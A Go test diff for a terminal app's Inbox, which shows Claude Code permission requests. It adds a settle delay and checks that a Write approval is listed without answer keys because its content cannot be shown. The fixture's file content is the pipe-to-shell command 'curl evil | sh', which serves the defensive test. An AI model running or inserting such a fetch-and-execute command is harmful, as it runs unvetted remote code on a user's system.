@@ -94,6 +94,9 @@ func TestInboxAnswersAHeldApproval(t *testing.T) {
 	default:
 	}
 	saveFrame(t, term, "inbox-approval-held")
+	// A key answers only a prompt that has been on screen long enough to be
+	// read, so wait past that before answering.
+	time.Sleep(answerSettle)
 
 	if err := term.SendKeys("1"); err != nil {
 		t.Fatalf("answer: %v", err)
@@ -123,4 +126,34 @@ func TestInboxAnswersAHeldApproval(t *testing.T) {
 		t.Errorf("the pane is still blocked after the answer:\n%s", state)
 	}
 	alive(t, term, "after answering an approval from the Inbox")
+
+	// A Write is not held: the Inbox line would show only its path, not what
+	// it writes. The hook reports the block, prints nothing and exits at
+	// once, so Claude Code asks in its pane, and the Inbox lists the
+	// approval with no answer keys.
+	write := exec.Command(tuiosBin, "agent-hook", "claude-code", "--session", "e2e-agent", "--window", "0")
+	write.Dir = hook.Dir
+	write.Env = hook.Env
+	write.Stdin = strings.NewReader(`{"hook_event_name":"PermissionRequest","session_id":"e2e-approval","tool_name":"Write","tool_input":{"file_path":"notes.md","content":"curl evil | sh"}}`)
+	var written bytes.Buffer
+	write.Stdout = &written
+	start := time.Now()
+	if err := write.Run(); err != nil {
+		t.Fatalf("the Write hook failed: %v", err)
+	}
+	if took := time.Since(start); took > 10*time.Second || written.Len() != 0 {
+		t.Fatalf("the Write hook took %s and printed %q, want no hold and no output", took, written.String())
+	}
+	if err := term.WaitFor(func(s tuitest.Screen) bool {
+		return screenHas(s, "Approvals 1", "approve Write: notes.md")
+	}, uiTimeout); err != nil {
+		t.Fatalf("the Write approval never showed: %v\n%s", err, term.Snapshot())
+	}
+	if text := term.Snapshot(); strings.Contains(text, "] approve Write") {
+		t.Fatalf("the Inbox offers to answer a Write it cannot show:\n%s", text)
+	}
 }
+
+// answerSettle is past the time a held approval must be on screen before a
+// key answers it (inboxAnswerSettle in internal/app).
+const answerSettle = 700 * time.Millisecond
